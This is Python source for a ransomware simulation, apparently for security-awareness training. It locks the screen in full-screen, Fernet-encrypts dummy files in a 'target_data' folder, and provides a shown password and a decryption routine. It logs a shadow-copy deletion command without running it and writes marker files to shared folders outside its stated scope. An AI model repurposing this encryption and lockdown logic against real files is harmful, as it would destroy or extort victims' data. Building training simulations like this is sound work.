"""
WANA DECRYPT0R 3.0 - Advanced Ransomware Simulation with GUI
=============================================================

High-Fidelity Ransomware Training Simulation
- Full-screen GUI lockdown
- Real encryption with Fernet
- MITRE ATT&CK technique simulation
- VSS tampering simulation (T1490)
- Lateral movement simulation (T1021)
- File encryption (T1486)
- Training mode with decryption capability

USAGE:
    python wana_decrypt0r_gui.py

SAFETY:
    - Only encrypts files in 'target_data' directory
    - Includes decryption functionality
    - Simulation mode available without cryptography library
"""

import os
import sys
import time
import threading
import subprocess
import tkinter as tk
from tkinter import messagebox
import logging
import random

# --- CONFIGURATION ---
TARGET_DIR = "target_data"
KEY_FILE = "encryption_key.key"
RANSOM_NOTE = "READ_ME_NOW.txt"
LATERAL_FILE = "hacked_lateral.txt"

# VISUALS
BG_COLOR = "#1a0000"     # Deep Blood Red/Black
TEXT_COLOR = "#00ff00"   # Matrix Green
ALERT_COLOR = "#ff0000"  # Bright Red
FONT_TITLE = ("Impact", 40)
FONT_LOG = ("Consolas", 10)
# ---------------------

# Setup Logger
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

try:
    from cryptography.fernet import Fernet
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False
    print("[WARNING] cryptography library not installed. Running in simulation mode.")
    print("Install with: pip install cryptography")

def ensure_target_exists():
    """Ensures target directory and dummy files exist."""
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        
    demos = ["confidential_hr.xlsx", "q3_financials.pdf", "ceo_passwords.txt", "network_map.png"]
    for d in demos:
        path = os.path.join(TARGET_DIR, d)
        if not os.path.exists(path):
            with open(path, "w") as f:
                f.write("CONFIDENTIAL DATA SIMULATION " * 50)

# --- MITRE ATT&CK SIMULATIONS ---

def simulate_vss_tampering(log_func):
    """Simulates T1490: Inhibit System Recovery."""
    log_func("EXEC: vssadmin delete shadows /all /quiet", "T1490")
    # We don't actually delete shadows, just pretend
    time.sleep(0.5)
    log_func("SUCCESS: Shadow Copies Removed (Simulated).", "T1490")

def simulate_lateral_movement(log_func):
    """Simulates T1021: Remote Services."""
    log_func("SCANNING: Network Shares...", "T1021")
    shares = ["C:\\Users\\Public", "Z:\\Shared"]  # Example paths
    for share in shares:
        if os.path.exists(share):
            try:
                dest = os.path.join(share, LATERAL_FILE)
                with open(dest, "w") as f:
                    f.write("Lateral Movement Test")
                log_func(f"SPREAD: {dest}", "T1021")
            except:
                pass
    log_func("LATERAL MOVEMENT COMPLETE.", "T1021")

# --- ENCRYPTION LOGIC ---

def encryption_worker(gui_log_func):
    """Real Encryption Logic running in background."""
    gui_log_func("INITIALIZING PAYLOAD v2.0...", "INIT")
    simulate_vss_tampering(gui_log_func)
    simulate_lateral_movement(gui_log_func)
    
    ensure_target_exists()
    
    key = None
    fernet = None
    
    if HAS_CRYPTO:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
        fernet = Fernet(key)
        gui_log_func(f"KEY GEN: {KEY_FILE}", "T1486")
    
    count = 0
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file == RANSOM_NOTE or file.endswith(".locked") or file == KEY_FILE:
                continue
            
            path = os.path.join(root, file)
            try:
                # Read
                with open(path, "rb") as f:
                    data = f.read()
                # Encrypt
                enc = fernet.encrypt(data) if fernet else b"SIM_" + data
                # Write
                with open(path, "wb") as f:
                    f.write(enc)
                # Rename
                os.rename(path, path + ".locked")
                
                gui_log_func(f"LOCKED: {file}", "T1486")
                count += 1
                time.sleep(0.1)  # Visual effect
            except Exception as e:
                gui_log_func(f"ERR: {file} - {e}", "FAIL")
                
    # Drop Note
    with open(os.path.join(TARGET_DIR, RANSOM_NOTE), "w") as f:
        f.write("YOUR FILES ARE ENCRYPTED. THIS IS A SIMULATION.")
        
    gui_log_func("PAYLOAD EXECUTION COMPLETE.", "DONE")
    gui_log_func("WAITING FOR USER RESPONSE...", "WAIT")

# --- GUI CLASS ---

class RansomwareGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("RansomRun - Security Training Simulation")
        self.root.configure(bg=BG_COLOR)
        
        # AGGRESSIVE LOCKDOWN
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.focus_force()
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Timer: 24 hours in seconds
        self.remaining_seconds = 24 * 60 * 60

        # 1. HEADER with RansomRun branding
        header_frame = tk.Frame(root, bg=ALERT_COLOR)
        header_frame.pack(fill="x")
        
        tk.Label(header_frame, text="[!] CRITICAL SECURITY ALERT [!]", 
                 bg=ALERT_COLOR, fg="white", font=("Impact", 48), pady=15).pack()

        # 2. SKULL LOGO + TEAM NAME
        logo_frame = tk.Frame(root, bg=BG_COLOR)
        logo_frame.pack(pady=10)
        
        # Skull ASCII art / emoji
        tk.Label(logo_frame, text="💀", font=("Arial", 80), bg=BG_COLOR, fg="white").pack()
        
        tk.Label(root, text=">> Team: DONT WANNA CRY <<", 
                 bg=BG_COLOR, fg="white", font=("Consolas", 24, "bold"), pady=5).pack()

        # 3. MAIN MESSAGE
        tk.Label(root, text="YOUR SYSTEM HAS BEEN COMPROMISED", 
                 bg=BG_COLOR, fg=ALERT_COLOR, font=("Arial", 28, "bold")).pack(pady=5)
        
        tk.Label(root, text="All files encrypted with military-grade encryption.", 
                 bg=BG_COLOR, fg="#ff9900", font=("Arial", 14)).pack()
        tk.Label(root, text="Enter the correct password to decrypt your files.", 
                 bg=BG_COLOR, fg="#ff9900", font=("Arial", 14)).pack(pady=5)

        # 4. TIMER SECTION
        timer_frame = tk.Frame(root, bg="#000033", bd=3, relief="ridge")
        timer_frame.pack(pady=20, padx=100)
        
        tk.Label(timer_frame, text="TIME REMAINING:", 
                 bg="#000033", fg="white", font=("Arial", 12)).pack(pady=5)
        self.timer_lbl = tk.Label(timer_frame, text="23:59:59", 
                                   font=("Digital-7", 72) if self._font_exists("Digital-7") else ("Impact", 60), 
                                   bg="#000022", fg="#ff3333", padx=40, pady=10)
        self.timer_lbl.pack(padx=20, pady=10)
        
        # Start countdown
        self.update_timer()

        # 5. ENCRYPTION LOG
        tk.Label(root, text="[ENCRYPTION LOG]", 
                 bg=BG_COLOR, fg="white", font=("Consolas", 12, "bold")).pack(pady=10)
        
        log_frame = tk.Frame(root, bg="black", bd=2, relief="sunken")
        log_frame.pack(fill="both", expand=True, padx=50, pady=5)
        
        self.log_box = tk.Text(log_frame, bg="black", fg=TEXT_COLOR, font=FONT_LOG, height=8)
        self.log_box.pack(fill="both", expand=True, padx=5, pady=5)

        # 6. DECRYPT BUTTON
        btn_frame = tk.Frame(root, bg=BG_COLOR)
        btn_frame.pack(pady=15)
        
        self.btn = tk.Button(btn_frame, text="[ ENTER PASSWORD TO DECRYPT ]", 
                             font=("Arial", 18, "bold"), 
                             bg="#ff6600", fg="white", 
                             activebackground="#ff9933", activeforeground="white",
                             padx=40, pady=15, cursor="hand2",
                             command=self.decrypt_sequence)
        self.btn.pack()

        # 7. PASSWORD HINT BOX
        hint_frame = tk.Frame(root, bg="#1a1a1a", bd=2, relief="ridge")
        hint_frame.pack(pady=10)
        
        tk.Label(hint_frame, text="DECRYPTION PASSWORD:", 
                 bg="#1a1a1a", fg="#888888", font=("Arial", 10)).pack(pady=5)
        tk.Label(hint_frame, text="DontWannaCry2025", 
                 bg="#1a1a1a", fg="#00ff00", font=("Consolas", 18, "bold")).pack(pady=5)
        tk.Label(hint_frame, text="Use this password to decrypt files | ESC to decrypt", 
                 bg="#1a1a1a", fg="#666666", font=("Arial", 9)).pack(pady=5)

        # 8. DISCLAIMER / AWARENESS SECTION
        disclaimer_frame = tk.Frame(root, bg="#1a0a0a", bd=2, relief="ridge")
        disclaimer_frame.pack(fill="x", side="bottom", pady=0)
        
        # Main awareness message - "If You Don't Wanna Cry"
        tk.Label(disclaimer_frame, 
                 text="💀 IF YOU DON'T WANNA CRY, DON'T LET YOUR GUARD DOWN! 💀", 
                 bg="#1a0a0a", fg="#ff4444", font=("Impact", 18), pady=10).pack()
        
        tk.Label(disclaimer_frame, 
                 text="This could have been real. Your files, your memories, your work — gone in seconds.",
                 bg="#1a0a0a", fg="#ff9999", font=("Arial", 12, "italic"), pady=5).pack()
        
        tk.Label(disclaimer_frame, 
                 text="One wrong click is all it takes. Stay vigilant. Stay protected. Stay safe.",
                 bg="#1a0a0a", fg="#ffcc00", font=("Arial", 11, "bold"), pady=5).pack()
        
        # Footer branding
        footer_frame = tk.Frame(disclaimer_frame, bg="#0f0505")
        footer_frame.pack(fill="x", pady=8)
        tk.Label(footer_frame, text="💀 RansomRun - Security Awareness Training 💀", 
                 bg="#0f0505", fg="#888888", font=("Arial", 10)).pack()
        tk.Label(footer_frame, text="SIMULATION MODE - No actual harm done to your system", 
                 bg="#0f0505", fg="#666666", font=("Arial", 9)).pack()

        # ESC key binding for quick decrypt
        self.root.bind("<Escape>", lambda e: self.decrypt_sequence())
        
        # Start Pulse Animation
        self.pulse_ind = 0
        self.pulse_colors = [ALERT_COLOR, "#b30000"]
    
    def _font_exists(self, font_name):
        """Check if a font exists on the system."""
        try:
            import tkinter.font as tkfont
            return font_name in tkfont.families()
        except:
            return False
    
    def update_timer(self):
        """Update countdown timer every second."""
        if self.remaining_seconds > 0:
            hours = self.remaining_seconds // 3600
            minutes = (self.remaining_seconds % 3600) // 60
            seconds = self.remaining_seconds % 60
            self.timer_lbl.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
            self.remaining_seconds -= 1
            self.root.after(1000, self.update_timer)

    def pulse_icon(self):
        self.pulse_ind = (self.pulse_ind + 1) % 2
        self.lock_char.config(fg=self.pulse_colors[self.pulse_ind])
        self.root.after(800, self.pulse_icon)

    def add_log(self, msg, tag):
        """Thread-safe logging to GUI."""
        full_msg = f"[{time.strftime('%H:%M:%S')}] [{tag}] {msg}\n"
        self.log_box.insert(tk.END, full_msg)
        self.log_box.see(tk.END)

    def decrypt_sequence(self):
        """The 'Training Mode' Reveal."""
        if messagebox.askyesno("Confirm Restore", "Did you learn from this simulation?\n(Click Yes to Decrypt)"):
            if run_decryption_logic():
                messagebox.showinfo("RECOVERY", "✅ SYSTEM RESTORED. \n\nRemember: Don't click unknown links!")
                self.root.destroy()
                sys.exit(0)
            else:
                messagebox.showerror("Error", "Decryption failed (Check Key File).")

# --- DECRYPTION LOGIC ---
def run_decryption_logic():
    print("Decrypting...")
    if HAS_CRYPTO and os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            key = f.read()
        fernet = Fernet(key)
        for root, _, files in os.walk(TARGET_DIR):
            for file in files:
                if file.endswith(".locked"):
                    path = os.path.join(root, file)
                    try:
                        with open(path, "rb") as f:
                            d = f.read()
                        res = fernet.decrypt(d)
                        with open(path.replace(".locked", ""), "wb") as f:
                            f.write(res)
                        os.remove(path)
                    except:
                        pass
        return True
    elif not HAS_CRYPTO:
        # Sim mode
        for root, _, files in os.walk(TARGET_DIR):
            for file in files:
                path = os.path.join(root, file)
                if path.endswith(".locked"):
                    try:
                        with open(path, "rb") as f:
                            d = f.read()
                        d = d.replace(b"SIM_", b"")
                        with open(path.replace(".locked", ""), "wb") as f:
                            f.write(d)
                        os.remove(path)
                    except:
                        pass
        return True
    return False

def main():
    # SETUP
    root = tk.Tk()
    gui = RansomwareGUI(root)
    
    # RUN PAYLOAD IN BACKGROUND
    # Pass the GUI's logging function to the worker
    t = threading.Thread(target=encryption_worker, args=(gui.add_log,))
    t.daemon = True
    t.start()
    
    root.mainloop()

if __name__ == "__main__":
    main()
